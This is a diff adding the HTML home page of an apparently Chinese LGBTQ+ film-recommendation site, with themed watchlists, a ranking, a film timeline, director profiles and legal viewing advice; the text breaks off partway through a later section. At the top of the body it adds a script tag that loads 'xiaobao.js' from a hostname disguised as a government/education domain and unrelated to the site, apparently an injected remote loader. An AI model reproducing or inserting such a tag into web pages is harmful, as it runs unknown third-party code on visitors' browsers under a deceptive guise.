@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="同性电影网 - 一份关于爱与身份的观影清单：同志电影、LGBTQ+ 电影、同性恋题材电影、酷儿电影、跨性别电影、出柜电影、爱情电影、独立电影、纪录片、短片、电影节获奖片与 4K 修复版。影视赏析与正版观影指南。">
+<meta name="keywords" content="同性电影网,同性电影,同志电影,LGBTQ+电影,酷儿电影,跨性别电影,出柜电影,爱情电影,独立电影,纪录片,电影节,4K修复,正版观影,电影推荐">
+<meta name="author" content="同性电影网">
+<meta name="theme-color" content="#f4f1ec">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<title>同性电影网 · 一份关于爱与身份的观影清单</title>
+<link rel="canonical" href="https://tongxingdianyingwang-cn.github.io/">
+<style>
+:root{
+  --ink:#23201c; --ink2:#4a453e; --mute:#8c867c;
+  --paper:#f4f1ec; --card:#fffdfa;
+  --rose:#e8626f;   /* 主色 玫瑰 */
+  --plum:#7b4a6b;   /* 梅紫 */
+  --sage:#7d8f76;   /* 鼠尾草绿 */
+  --amber:#d99a3f;  /* 琥珀 */
+  --mono:ui-monospace,Menlo,Consolas,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",Inter,system-ui,sans-serif;
+  --serif:"Songti SC","SimSun",Georgia,serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:var(--sans);background:var(--paper);color:var(--ink);line-height:1.9;font-size:15px;
+  background-image:linear-gradient(rgba(232,98,111,.05) 1px,transparent 1px),linear-gradient(90deg,rgba(232,98,111,.05) 1px,transparent 1px);background-size:100% 19px}
+a{color:inherit;text-decoration:none;outline:none}
+a:focus-visible,button:focus-visible,input:focus-visible{outline:2.2px solid var(--rose);outline-offset:3px}
+::selection{background:var(--rose);color:#fff}
+::placeholder{font-family:var(--serif);font-size:12.2px;color:#b6b0a6}
+.wrap{max-width:1200px;margin:0 auto;padding:0 32px;position:relative}
+
+.topbar{position:sticky;top:0;z-index:50;background:rgba(244,241,236,.96);backdrop-filter:blur(10px);border-bottom:2.2px solid var(--ink)}
+.hd{display:flex;align-items:center;gap:20px;padding:11px 0}
+.logo{display:flex;align-items:center;gap:13px;white-space:nowrap}
+.marq{width:34px;height:54px;flex:none;position:relative;border:2.2px solid var(--ink);border-radius:50% 50% 50% 50%/60% 60% 40% 40%;background:linear-gradient(180deg,var(--rose),var(--plum));transform:rotate(-7deg);box-shadow:inset 0 -9px 0 rgba(0,0,0,.16)}
+.marq:before{content:"";position:absolute;left:50%;top:8px;transform:translateX(-50%);width:2.4px;height:9px;background:rgba(255,255,255,.9);border-radius:3px}
+.marq:after{content:"";position:absolute;left:50%;bottom:7px;transform:translateX(-50%);width:8px;height:8px;border-radius:50%;background:rgba(255,255,255,.9)}
+.logo span b{font-size:19.6px;font-weight:900;letter-spacing:1.2px}
+.logo em{font-style:normal;font-family:var(--mono);font-size:7.8px;letter-spacing:.9px;color:var(--mute);display:block;font-weight:700}
+nav{display:flex;gap:4px;margin-left:auto;font-size:11.4px;letter-spacing:.4px;font-weight:900}
+nav a{padding:8px 11px;border-radius:19px;transition:.2s}
+nav a:hover{background:var(--rose);color:#fff;transform:translateY(-3px)}
+.search{display:flex;background:#fff;border:2.2px solid var(--ink);border-radius:19px;padding:5px 5px 5px 13px;gap:7px;width:100%;max-width:226px}
+.search input{border:0;background:transparent;font:inherit;font-size:12.2px;flex:1;outline:none}
+.search button{border:0;border-radius:15px;background:var(--plum);color:#fff;font-weight:900;font-size:10.2px;padding:0 13px;letter-spacing:1.1px;cursor:pointer}
+.ham{display:none;background:none;border:2.2px solid var(--ink);border-radius:11px;font-size:16px;cursor:pointer;padding:6px 10px;color:var(--ink);line-height:1}
+
+.hero{padding:36px 0 26px}
+.hero .wrap{display:grid;grid-template-columns:1.02fr .98fr;gap:38px;align-items:center}
+.hero .eyebrow{font-family:var(--mono);font-size:8.2px;letter-spacing:3.2px;color:var(--rose);font-weight:700}
+.hero h1{font-size:clamp(27px,5.4vw,52px);line-height:1.3;font-weight:900;letter-spacing:.3px;margin:11px 0 13px;font-family:var(--serif)}
+.hero h1 u{text-decoration:none;border-bottom:8px solid var(--rose);padding-bottom:2px}
+.hero .lead{color:var(--ink2);font-size:14.4px;line-height:1.98;text-align:justify;max-width:62ch}
+.hero .lead b{color:var(--plum)}
+.hero .cta{display:flex;gap:11px;margin-top:18px;flex-wrap:wrap}
+.hero .cta a{font-size:12.2px;font-weight:900;letter-spacing:.9px;padding:12px 23px;border-radius:21px;transition:.24s;border:2.2px solid var(--ink)}
+.hero .cta a.p{background:var(--rose);color:#fff;box-shadow:0 8px 0 var(--plum)}
+.hero .cta a.s{background:transparent}
+.hero .cta a:hover{transform:translateY(-5px)}
+
+/* quote card */
+.qt{background:var(--card);border:2.2px solid var(--ink);border-radius:10px;padding:22px 24px;box-shadow:0 26px 60px -28px rgba(35,32,28,.55);transform:rotate(.7deg)}
+.qt:before{content:"\201C";font-family:var(--serif);font-size:74px;line-height:.6;color:var(--rose);display:block}
+.qt p.q{font-family:var(--serif);font-size:17.4px;line-height:1.85;font-weight:700;margin:-6px 0 12px;color:var(--ink)}
+.qt .who{display:flex;align-items:baseline;gap:8px;border-top:2.2px solid var(--ink);padding-top:10px;font-size:11.4px;color:var(--mute);font-family:var(--mono);letter-spacing:.5px}
+.qt .who b{font-family:var(--sans);font-size:12.6px;color:var(--ink);letter-spacing:.3px}
+.qt .tags{display:flex;gap:7px;flex-wrap:wrap;margin-top:13px}
+.qt .tags i{font-style:normal;font-family:var(--mono);font-size:8.4px;letter-spacing:.7px;color:var(--plum);border:1.8px solid var(--plum);border-radius:10px;padding:3px 11px;font-weight:700}
+
+section{padding:44px 0}
+.sec{display:flex;align-items:baseline;gap:10px;flex-wrap:wrap;border-bottom:2.2px solid var(--ink);padding-bottom:8px;margin-bottom:22px}
+.sec .no{font-family:var(--mono);font-size:8.4px;letter-spacing:1.4px;color:#fff;background:var(--rose);border-radius:10px;padding:4px 10px;font-weight:900;line-height:1.6}
+.sec h2{font-size:clamp(16.6px,2.6vw,22px);font-weight:900;letter-spacing:.3px;font-family:var(--serif)}
+.sec .en{font-family:var(--mono);font-size:7.8px;letter-spacing:2.2px;color:var(--mute);text-transform:uppercase;font-weight:700}
+.sec a.more{margin-left:auto;font-size:11px;letter-spacing:.6px;color:var(--mute);border-bottom:2.2px solid var(--rose);padding-bottom:2px;font-weight:900}
+.sec a.more:hover{color:var(--rose)}
+
+/* 01 voices */
+.voices{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.vo{background:var(--card);border:2.2px solid var(--ink);border-radius:9px;padding:17px 18px;cursor:pointer;transition:.26s;position:relative;overflow:hidden}
+.vo .en2{font-family:var(--mono);font-size:8.2px;letter-spacing:1.6px;font-weight:900;color:var(--c);border:1.8px solid var(--c);border-radius:9px;padding:2px 9px;display:inline-block;margin-bottom:7px}
+.vo h4{font-size:15px;font-weight:900;line-height:1.45;margin-bottom:6px;font-family:var(--serif)}
+.vo p{font-size:10.8px;color:var(--mute);line-height:1.9;text-align:justify}
+.vo .cap{margin-top:8px;font-family:var(--mono);font-size:7.8px;letter-spacing:1.3px;color:var(--c);border-top:1.6px dashed var(--c);padding-top:5px;font-weight:700}
+.vo:hover{transform:translateY(-7px);box-shadow:0 12px 26px rgba(35,32,28,.17)}
+
+/* 02 reels */
+.reels{display:grid;grid-template-columns:repeat(3,1fr);gap:15px}
+.re{background:var(--card);border:2.2px solid var(--ink);border-radius:9px;padding:18px 20px 16px;cursor:pointer;transition:.26s;position:relative}
+.re .ribbon{position:absolute;right:-2.2px;top:13px;background:var(--c);color:#fff;font-family:var(--mono);font-size:7.6px;letter-spacing:1.3px;padding:4px 10px;border-radius:3px 0 0 3px;font-weight:900}
+.re h4{font-size:16px;font-weight:900;line-height:1.4;margin-bottom:8px;font-family:var(--serif)}
+.re ol{margin:0 0 9px 16px;padding:0}
+.re li{font-size:10.9px;line-height:1.92;color:var(--ink2)}
+.re li b{color:var(--ink)}
+.re .cap{font-family:var(--mono);font-size:7.6px;letter-spacing:1.4px;color:var(--c);border-top:1.6px dashed var(--c);padding-top:6px;font-weight:700}
+.re:hover{background:var(--c);color:#fff}
+.re:hover li,.re:hover .cap{color:rgba(255,255,255,.93)}
+.re:hover li b{color:#fff}
+.re:hover .cap{border-color:rgba(255,255,255,.5)}
+
+/* 03 ladder */
+.ladder{display:grid;grid-template-columns:repeat(3,1fr);gap:0;align-items:flex-end;height:258px;border-bottom:3.4px solid var(--ink);padding:0 10px}
+.la{position:relative;background:var(--c);border:2.2px solid var(--ink);border-bottom:0;border-radius:5px 5px 0 0;height:0;transition:height 1.05s cubic-bezier(.2,.8,.2,1);cursor:pointer}
+.la .top{position:absolute;left:0;right:0;top:-33px;text-align:center}
+.la .top b{font-family:var(--mono);font-size:9px;letter-spacing:.7px;font-weight:900;color:var(--c)}
+.la .mid{position:absolute;inset:0;display:grid;place-items:center;text-align:center;color:#fff;padding:8px}
+.la .mid span{font-size:13.4px;line-height:1.5;font-weight:900;text-shadow:0 2px 0 rgba(0,0,0,.22)}
+.la .mid em{font-style:normal;font-family:var(--mono);font-size:7.2px;letter-spacing:1px;display:block;margin-top:5px;opacity:.93}
+.la:hover{filter:brightness(1.06)}
+
+/* 04 timeline */
+.tl{position:relative;padding-left:34px;margin-top:6px}
+.tl:before{content:"";position:absolute;left:9px;top:6px;bottom:6px;width:2.6px;background:repeating-linear-gradient(180deg,var(--rose) 0 7px,transparent 7px 14px)}
+.node{position:relative;background:var(--card);border:2.2px solid var(--ink);border-radius:8px;padding:14px 18px;margin-bottom:13px;cursor:pointer;transition:.24s}
+.node:before{content:"";position:absolute;left:-30px;top:20px;width:13px;height:13px;border-radius:50%;background:var(--c);border:2.6px solid var(--paper);box-shadow:0 0 0 2.6px var(--c)}
+.node .yr{font-family:var(--mono);font-size:8.6px;letter-spacing:1.5px;color:var(--c);font-weight:900}
+.node h4{font-size:15.4px;font-weight:900;line-height:1.4;margin:2px 0 5px;font-family:var(--serif)}
+.node p{font-size:10.9px;color:var(--mute);line-height:1.9;text-align:justify}
+.node:hover{transform:translateX(6px);box-shadow:0 10px 24px rgba(35,32,28,.16)}
+
+/* 05 posters */
+.posters{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.po{background:var(--card);border:2.2px solid var(--ink);border-radius:9px;overflow:hidden;cursor:pointer;transition:.26s}
+.po .post{height:130px;background:linear-gradient(135deg,var(--c),color-mix(in srgb,var(--c) 55%,#2a2420));position:relative}
+.po .post:before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(45deg,transparent 0 9px,rgba(255,255,255,.05) 9px 11px)}
+.po .post span{position:absolute;left:14px;right:14px;bottom:12px;color:#fff;font-family:var(--serif);font-size:17px;font-weight:900;line-height:1.3;text-shadow:0 2px 0 rgba(0,0,0,.3)}
+.po .in{padding:12px 15px 14px}
+.po .in b{font-size:13px;display:block;line-height:1.5}
+.po .in small{font-family:var(--mono);font-size:8.4px;letter-spacing:.7px;color:var(--c);font-weight:700;display:block;margin:5px 0 6px}
+.po .in p{font-size:10.4px;color:var(--mute);line-height:1.85;text-align:justify;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;overflow:hidden}
+.po:hover{transform:translateY(-7px);box-shadow:0 12px 26px rgba(35,32,28,.17)}
+
+/* 06 auteurs */
+.auteurs{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.au{background:var(--card);border:2.2px solid var(--ink);border-radius:9px;padding:17px 19px;cursor:pointer;transition:.26s;position:relative}
+.au .no2{position:absolute;right:15px;top:12px;font-family:var(--serif);font-size:26px;font-weight:900;color:rgba(232,98,111,.22);line-height:1}
+.au h4{font-size:16.4px;font-weight:900;line-height:1.4;font-family:var(--serif)}
+.au .en3{font-family:var(--mono);font-size:7.6px;letter-spacing:1.5px;color:var(--mute);margin:3px 0 8px;font-weight:700}
+.au p{font-size:10.8px;color:var(--mute);line-height:1.9;text-align:justify}
+.au .see{margin-top:9px;font-family:var(--mono);font-size:8.2px;letter-spacing:1.3px;color:var(--c);border-top:1.6px dashed var(--c);padding-top:6px;font-weight:700}
+.au:hover{transform:translateY(-7px);box-shadow:0 12px 26px rgba(35,32,28,.17)}
+
+/* 07 watch */
+.watch{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.wh{background:var(--card);border:2.2px solid var(--ink);border-radius:9px;padding:16px 17px;cursor:pointer;transition:.26s}
+.wh .ic{width:44px;height:44px;border-radius:12px;background:var(--c);color:#fff;display:grid;place-items:center;font-family:var(--serif);font-weight:900;font-size:19px;margin-bottom:10px;box-shadow:inset 0 -5px 0 rgba(0,0,0,.16)}
+.wh h4{font-size:14.4px;font-weight:900;line-height:1.45;margin-bottom:6px;font-family:var(--serif)}
+.wh p{font-size:10.5px;color:var(--mute);line-height:1.9;text-align:justify}
+.wh .tag{margin-top:8px;font-family:var(--mono);font-size:7.8px;letter-spacing:1.3px;color:var(--c);font-weight:900}
+.wh:hover{transform:translateY(-7px);box-shadow:0 12px 26px rgba(35,32,28,.17)}
+
+/* 08 avoid */
+.avoid{display:grid;grid-template-columns:repeat(3,1fr);gap:13px}
+.av{background:var(--card);border:2.2px solid var(--ink);border-top:10px solid var(--plum);border-radius:6px;padding:15px 17px;cursor:pointer;transition:.24s}
+.av .no{font-family:var(--mono);font-size:7.8px;letter-spacing:1.8px;color:var(--plum);font-weight:900}
+.av h4{font-size:13.6px;margin:6px 0 6px;font-weight:900;line-height:1.45}
+.av p{font-size:10.5px;color:var(--mute);line-height:1.9;text-align:justify}
+
+.about{background:linear-gradient(160deg,var(--plum),#4a3150);color:var(--paper);border-radius:11px;padding:32px 36px;box-shadow:0 26px 66px -28px rgba(35,32,28,.72);transform:rotate(-.5deg)}
+.about p.led{font-size:18.6px;line-height:1.9;font-weight:900;margin-bottom:13px;color:#fff;font-family:var(--serif)}
+.about p.led b{color:var(--rose)}
+.about p{font-size:13.2px;text-align:justify;margin-bottom:12px;line-height:1.98;color:#e6dee4}
+.tags2{display:flex;gap:8px;flex-wrap:wrap}
+.tags2 a{font-family:var(--mono);font-size:8.8px;letter-spacing:.7px;color:var(--rose);border:1.8px solid var(--rose);border-radius:11px;padding:5px 12px;transition:.2s;font-weight:700;background:rgba(232,98,111,.1)}
+.tags2 a:hover{background:var(--rose);color:#fff;transform:rotate(-2.4deg)}
+
+footer{border-top:2.2px solid var(--ink);padding:38px 0 15px;margin-top:11px;background:rgba(244,241,236,.6)}
+.foot{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:26px;margin-bottom:21px}
+.foot .brand{font-size:17.2px;font-weight:900;letter-spacing:1px;display:flex;flex-direction:column;gap:8px}
+.foot .brand p{font-size:11.4px;color:var(--mute);line-height:1.92;max-width:330px;font-weight:700}
+.foot h5{font-family:var(--mono);font-size:7.8px;letter-spacing:2.2px;color:var(--rose);margin-bottom:9px;font-weight:700}
+.foot a{display:block;color:var(--mute);font-size:11.2px;padding:4px 0;font-weight:700;transition:.18s}
+.foot a:hover{color:var(--plum);transform:translateX(5px)}
+.copy{text-align:center;color:#989288;font-size:10px;border-top:2.2px dashed #c6c0b6;padding-top:13px;line-height:2;font-family:var(--mono);letter-spacing:.4px}
+.copy a{color:var(--plum);font-weight:700}
+
+@media(max-width:1120px){
+  .ham{display:block}
+  nav,.search{display:none}
+  .hero .wrap,.voices,.reels,.posters,.auteurs,.watch,.avoid,.foot{grid-template-columns:repeat(2,1fr)}
+  .qt{transform:none}
+  .drawer{position:fixed;inset:0 0 0 auto;width:86%;max-width:326px;background:var(--paper);padding:26px;border-left:11px solid var(--rose);transform:translateX(102%);transition:.32s;z-index:60;overflow:auto;box-shadow:-18px 0 40px rgba(0,0,0,.3)}
+  .drawer.open{transform:none}
+  .drawer a{display:block;font-size:15.4px;font-weight:900;padding:13px 10px;border-bottom:2.2px dashed rgba(232,98,111,.42);color:var(--ink)}
+  .drawer a:hover{color:var(--rose)}
+  .scrim{position:fixed;inset:0;background:rgba(35,32,28,.5);opacity:0;pointer-events:none;transition:.32s;z-index:59}
+  .scrim.on{opacity:1;pointer-events:auto}
+}
+@media(max-width:640px){
+  .wrap{padding:0 16px}
+  .hero h1{font-size:26px}
+  .hero .wrap,.voices,.reels,.posters,.auteurs,.watch,.avoid,.foot{grid-template-columns:1fr}
+  .ladder{height:200px}
+  .qt p.q{font-size:15px}
+}
+@media print{body{background:#fff;color:#000}.ham,.search,.scrim,.drawer,.topbar{position:static!important;display:none!important}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <div class="hd">
+      <a class="logo" href="#" aria-label="同性电影网 首页">
+        <span class="marq" aria-hidden="true"></span>
+        <span><b>同性电影网</b><em>QUEER CINEMA · A WATCHLIST</em></span>
+      </a>
+      <nav>
+        <a href="#c01">六种声音</a>
+        <a href="#c02">三卷片单</a>
+        <a href="#c03">榜</a>
+        <a href="#c04">时间轴</a>
+        <a href="#c05">导演</a>
+        <a href="#c06">观看方式</a>
+      </nav>
+      <div class="search" role="search">
+        <input type="search" placeholder="搜心情、导演、片名、年份" aria-label="搜索">
+        <button aria-label="搜索">搜</button>
+      </div>
+      <button class="ham" id="ham" aria-label="菜单" aria-expanded="false">☰</button>
+    </div>
+  </div>
+  <div class="drawer" id="drawer" aria-label="移动端导航">
+    <a href="#c01">六种声音</a>
+    <a href="#c02">三卷片单</a>
+    <a href="#c03">榜 · 三档</a>
+    <a href="#c04">时间轴</a>
+    <a href="#c05">六位导演</a>
+    <a href="#c06">观看方式</a>
+    <a href="#c07">六条避坑</a>
+    <a href="#about">关于本站</a>
+  </div>
+  <div class="scrim" id="scrim"></div>
+</div>
+
+<main>
+
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <div class="eyebrow">// NO. 001 · LOVE · IDENTITY · COURAGE</div>
+        <h1>爱与身份，<u>都值得被好好拍</u>。</h1>
+        <p class="lead">同性电影网是一份<b>关于爱与身份的观影清单</b>：<b>同志电影、LGBTQ+ 电影、酷儿电影、跨性别电影、出柜电影、爱情电影、独立电影、纪录片与短片</b>。我们不按"题材"给片子贴标签，而按<b>它替谁说话</b>来分卷。本站不托管资源、不提供盗链、不做违规采集，倡导正版、4K 修复版与院线支持。</p>
+        <div class="cta">
+          <a class="p" href="#c04">从时间轴看起</a>
+          <a class="s" href="#c02">先看三卷片单</a>
+        </div>
+      </div>
+      <div class="qt" aria-label="编辑部的话">
+        <p class="q">“重要的不是电影里的他们是同性恋，而是电影终于允许他们像所有人一样，普通地爱、普通地痛、普通地失败。”</p>
+        <div class="who"><span>编辑部 · 第 12 条片单原则</span> <b>· 不猎奇、不病理化、不看苦难消费</b></div>
+        <div class="tags">
+          <i>LOVE</i><i>IDENTITY</i><i>COURAGE</i><i>CHOSEN FAMILY</i><i>COMING OF AGE</i>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 01 voices -->
+  <section id="c01" class="wrap">
+    <div class="sec">
+      <span class="no">01</span>
+      <h2>六种声音 · 替谁说话</h2>
+      <span class="en">Six Voices</span>
+      <a class="more" href="#">完整清单 ›</a>
+    </div>
+    <div class="voices">
+      <a class="vo" href="#" style="--c:var(--rose)"><span class="en2">VOICE 01 · FIRST LOVE</span><h4>初恋与暗恋</h4><p>第一次心动，第一次被拒绝，第一次知道自己和别人不太一样。这类片子最好看的是"还没说出口"。</p><span class="cap">PICK · 《请以你的名字呼唤我》《断背山》</span></a>
+      <a class="vo" href="#" style="--c:var(--plum)"><span class="en2">VOICE 02 · COMING OUT</span><h4>出柜与家人</h4><p>不是一场演讲，是一顿饭、一扇门、一句"我早就知道了"。最难写的戏，往往最安静。</p><span class="cap">PICK · 《喜宴》《天佑鲍比》</span></a>
+      <a class="vo" href="#" style="--c:var(--sage)"><span class="en2">VOICE 03 · CHOSEN FAMILY</span><h4>选择的家人</h4><p>血缘不给的，朋友给。 drag 酒吧、合租屋、深夜厨房，都是教堂。</p><span class="cap">PICK · 《姿态》《同路人》</span></a>
+      <a class="vo" href="#" style="--c:var(--amber)"><span class="en2">VOICE 04 · GROWING UP</span><h4>长大与青春期</h4><p>校服、操场、网吧、离家出走。少年感不是甜，是"还敢相信"。</p><span class="cap">PICK · 《心灵奇旅》之外的少年片</span></a>
+      <a class="vo" href="#" style="--c:var(--rose)"><span class="en2">VOICE 05 · AGING</span><h4>暮年与告别</h4><p>五十岁以后还敢爱吗？这类片子慢、长、几乎不配乐，看完会想给谁打电话。</p><span class="cap">PICK · 《依然爱丽丝》式的迟来</span></a>
+      <a class="vo" href="#" style="--c:var(--plum)"><span class="en2">VOICE 06 · TRANS &amp; BEYOND</span><h4>跨性别与非二元</h4><p>不是"变成了谁"，而是"终于可以穿自己想穿的衣服"。请先看导演是谁。</p><span class="cap">PICK · 由本人出演、本人执导</span></a>
+      <a class="vo" href="#" style="--c:var(--sage)"><span class="en2">VOICE 07 · DOCUMENTARY</span><h4>纪录片与真实</h4><p>真实的人比剧本勇敢。石墙之前、艾滋病危机、骄傲游行，都是正在发生的历史。</p><span class="cap">PICK · 《巴黎在燃烧》《月事》</span></a>
+      <a class="vo" href="#" style="--c:var(--amber)"><span class="en2">VOICE 08 · SHORT FILM</span><h4>短片与学生作</h4><p>15 分钟也能把人打碎。很多长片导演的起点，都在电影节短片单元。</p><span class="cap">PICK · 戛纳短片、柏林泰迪熊</span></a>
+    </div>
+  </section>
+
+  <!-- 02 reels -->
+  <section id="c02" class="wrap">
+    <div class="sec">
+      <span class="no">02</span>
+      <h2>三卷片单 · 今晚先看哪一类</h2>
+      <span class="en">Three Reels</span>
+      <a class="more" href="#">完整片单 ›</a>
+    </div>
+    <div class="reels">
+      <a class="re" href="#" style="--c:var(--rose)"><span class="ribbon">REEL 01</span><h4>第一卷 · 先让自己哭一场</h4><ol><li><b>《请以你的名字呼唤我》</b>2017 · 132 min</li><li><b>《断背山》</b>2005 · 134 min</li><li><b>《卡罗尔》</b>2015 · 118 min</li><li><b>《月光男孩》</b>2016 · 111 min</li></ol><span class="cap">MOOD · 雨夜 / 独处 / 允许哭</span></a>
+      <a class="re" href="#" style="--c:var(--plum)"><span class="ribbon">REEL 02</span><h4>第二卷 · 先让世界吵一次</h4><ol><li><b>《喜宴》</b>1993 · 106 min</li><li><b>《天佑鲍比》</b>2009 · 90 min</li><li><b>《普通之爱》</b>2022 · 98 min</li><li><b>《姿态》</b>剧集 · 单集 50 min</li></ol><span class="cap">MOOD · 和家人一起看 / 饭后</span></a>
+      <a class="re" href="#" style="--c:var(--sage)"><span class="ribbon">REEL 03</span><h4>第三卷 · 先让生活继续</h4><ol><li><b>《单身男子》</b>2009 · 99 min</li><li><b>《丹麦女孩》</b>2015 · 119 min</li><li><b>《燃烧女子的肖像》</b>2019 · 120 min</li><li><b>《星条红与皇室蓝》</b>2023 · 118 min</li></ol><span class="cap">MOOD · 周末 / 午后 / 不赶时间</span></a>
+    </div>
+  </section>
+
+  <!-- 03 ladder -->
+  <section id="c03" class="wrap">
+    <div class="sec">
+      <span class="no">03</span>
+      <h2>榜 · 三档必看</h2>
+      <span class="en">Top 3</span>
+      <a class="more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="ladder">
+      <a class="la" href="#" style="--c:var(--rose)" data-h="100"><div class="top"><b>NO.1</b></div><div class="mid"><span>请以你的名字呼唤我</span><em>2017 · 4K · 132 min</em></div></a>
+      <a class="la" href="#" style="--c:var(--plum)" data-h="79"><div class="top"><b>NO.2</b></div><div class="mid"><span>断背山</span><em>2005 · 修复 · 134 min</em></div></a>
+      <a class="la" href="#" style="--c:var(--amber)" data-h="61"><div class="top"><b>NO.3</b></div><div class="mid"><span>卡罗尔</span><em>2015 · 4K · 118 min</em></div></a>
+    </div>
+    <p style="font-size:11.2px;color:var(--mute);margin-top:15px;line-height:1.92;text-align:justify">榜单为编辑部主观整理，柱高代表"推荐强度"，<b>不代表评分高低</b>。排序依据三条：是否由当事人参与创作、是否拒绝猎奇化处理、是否有 4K 修复或正版蓝光版本可看。若一部片只在"猎奇合集号"里出现，它不进榜。</p>
+  </section>
+
+  <!-- 04 timeline -->
+  <section id="c04" class="wrap">
+    <div class="sec">
+      <span class="no">04</span>
+      <h2>时间轴 · 从 1961 到今天</h2>
+      <span class="en">Timeline</span>
+      <a class="more" href="#">完整年表 ›</a>
+    </div>
+    <div class="tl">
+      <a class="node" href="#" style="--c:var(--rose)"><div class="yr">1961</div><h4>《受害者》Victim</h4><p>第一部由主流影星主演、正面为同性恋辩护的英国电影。它上映时，相关法律还在。电影比法律先一步。</p></a>
+      <a class="node" href="#" style="--c:var(--plum)"><div class="yr">1985</div><h4>《蜘蛛女之吻》Kiss of the Spider Woman</h4><p>狱中两个男人，一个讲电影，一个成为电影。政治与情欲第一次被放在同一个镜头里，不审判、不猎奇。</p></a>
+      <a class="node" href="#" style="--c:var(--sage)"><div class="yr">1993</div><h4>《喜宴》The Wedding Banquet</h4><p>李安把"出柜"拍成了一桌菜。最重的台词，往往由最不会说话的人说出。家庭戏的教科书。</p></a>
+      <a class="node" href="#" style="--c:var(--amber)"><div class="yr">2005</div><h4>《断背山》Brokeback Mountain</h4><p>不是"西部片里的同性恋"，是两个男人被山和时代拆开。配乐一响，二十年过去。</p></a>
+      <a class="node" href="#" style="--c:var(--rose)"><div class="yr">2016</div><h4>《月光男孩》Moonlight</h4><p>三段人生、三种蓝色、三个名字。它证明：最私人的，就是最普遍的。奥斯卡最佳影片。</p></a>
+      <a class="node" href="#" style="--c:var(--plum)"><div class="yr">2019</div><h4>《燃烧女子的肖像》Portrait of a Lady on Fire</h4><p>没有男性凝视的爱情片。画家与被画者互换目光，最后那三分钟，是电影史上最贵的三分钟。</p></a>
+      <a class="node" href="#" style="--c:var(--sage)"><div class="yr">2023</div><h4>《去年的春天》</h4><p>青春片不再需要"出柜"作为高潮。主角只是长大了，恋爱了，毕业了——这本身就是进步。</p></a>
+    </div>
+  </section>
+
+  <!-- 05 posters -->
+  <section id="c05" class="wrap">
+    <div class="sec">
+      <span class="no">05</span>
+      <h2>六位作者 · 他们怎么拍</h2>
+      <span class="en">Six Auteurs</span>
+      <a class="more" href="#">完整名单 ›</a>
+    </div>
+    <div class="posters">
+      <a class="po" href="#" style="--c:var(--rose)"><div class="post"><span>李安</span></div><div class="in"><b>家庭的缝隙里，爱在呼吸</b><small>ANG LEE · SEE 5 部</small><p>他把"出柜"拍成吃饭。冲突不在街头，在饭桌上。</p></div></a>
+      <a class="po" href="#" style="--c:var(--plum)"><div class="post"><span>王家卫</span></div><div class="in"><b>过期的时间，不解释的爱</b><small>WONG KAR-WAI · SEE 4 部</small><p>同志叙事只是他时间观的一种。看他的片，请关灯。</p></div></a>
+      <a class="po" href="#" style="--c:var(--sage)"><div class="post"><span>瑟琳·席安玛</span></div><div class="in"><b>拿走男性凝视，剩下火焰</b><small>CÉLINE SCIAMMA · SEE 4 部</small><p>女性目光、古典构图、不配乐的告白。从《水仙花开》进。</p></div></a>
+      <a class="po" href="#" style="--c:var(--amber)"><div class="post"><span>卢卡·瓜达尼诺</span></div><div class="in"><b>夏天的长度，就是欲望的长度</b><small>L. GUADAGNINO · SEE 4 部</small><p>他把情欲拍成气候。《请以你的名字呼唤我》之后再难复刻。</p></div></a>
+      <a class="po" href="#" style="--c:var(--rose)"><div class="post"><span>佩德罗·阿莫多瓦</span></div><div class="in"><b>母亲、护士、变装皇后</b><small>P. ALMODÓVAR · SEE 6 部</small><p>色彩浓到失真，情感却最真。马德里是他的片场。</p></div></a>
+      <a class="po" href="#" style="--c:var(--plum)"><div class="post"><span>巴里·詹金斯</span></div><div class="in"><b>蓝色，是穷人的颜色</b><small>B. JENKINS · SEE 4 部</small><p>《月光男孩》之后，他把"不被看见的人"拍成了光。</p></div></a>
+    </div>
+  </section>
+
+  <!-- 06 watch -->
+  <section id="c06" class="wrap">
+    <div class="sec">
+      <span class="no">06</span>
+      <h2>观看方式 · 四种去处</h2>
+      <span class="en">How to Watch</span>
+      <a class="more" href="#">完整清单 ›</a>
+    </div>
+    <div class="watch">
+      <a class="wh" href="#" style="--c:var(--rose)"><div class="ic">院</div><h4>进电影院</h4><p>修复重映、电影节展映、艺术院线。大银幕是这类片最该被看见的地方，票房也是对创作者的直接投票。</p><span class="tag">DOSE · 每月 1 部</span></a>
+      <a class="wh" href="#" style="--c:var(--plum)"><div class="ic">正</div><h4>正版流媒体</h4><p>优先选有"4K / HDR / 原声"标识的版本。字幕质量直接影响台词理解，别图快看机翻。</p><span class="tag">REQ · 会员 / 4K 档</span></a>
+      <a class="wh" href="#" style="--c:var(--sage)"><div class="ic">碟</div><h4>蓝光与修复版</h4><p>Criterion、人造眼等厂牌的修复版，往往附带导演评论音轨与纪录片，是"看懂"的捷径。</p><span class="tag">REQ · 蓝光机 / 校色屏</span></a>
+      <a class="wh" href="#" style="--c:var(--amber)"><div class="ic">节</div><h4>电影节与展映</h4><p>上海、北京、香港、台北的 LGBT 影展与酷儿单元，很多片只在影展上映。关注排片，提前抢票。</p><span class="tag">REQ · 关注排片 / 学生票</span></a>
+    </div>
+  </section>
+
+  <!-- 07 avoid -->
+  <section id="c07" class="wrap">
+    <div class="sec">
+      <span class="no">07</span>
+      <h2>六条避坑</h2>
+      <span class="en">Stop Signals</span>
+      <a class="more" href="#">举报渠道 ›</a>
+    </div>
+    <div class="avoid">
